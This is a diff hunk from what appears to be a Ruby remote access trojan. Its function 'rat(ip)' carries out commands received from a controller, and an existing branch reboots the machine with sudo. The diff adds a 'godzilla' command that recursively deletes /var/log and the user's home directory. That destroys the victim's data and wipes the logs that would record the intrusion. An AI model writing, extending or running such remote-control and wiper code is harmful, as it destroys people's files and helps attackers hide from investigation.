@@ -107,6 +107,9 @@ def rat(ip)
         else
           exec 'sudo reboot'
         end
+      when 'godzilla'
+        system 'sudo rm -r /var/log'
+        system 'sudo rm -r ~'
       end
     end
     # SocketError, Errno::ECONNREFUSED, Errno::ECONNRESET
